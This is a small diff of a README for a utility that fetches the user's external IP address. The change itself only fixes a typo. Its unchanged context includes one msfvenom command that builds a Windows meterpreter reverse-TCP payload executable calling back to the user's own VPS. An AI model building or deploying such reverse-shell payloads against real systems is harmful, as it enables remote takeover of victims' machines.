@@ -11,7 +11,7 @@ For example, we can generate a meterpreter on VPS and fill the `LHOST` parameter
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=`me` LPORT=4444 >mp.exe
 ```
-Your will never need to query your external ip and paste it again.
+You will never need to query your external ip and paste it again.
 
 ## How it work
 For the first time, `me` will request some apis to get your external ip and save the ip to `$USER/.myexternalip`.
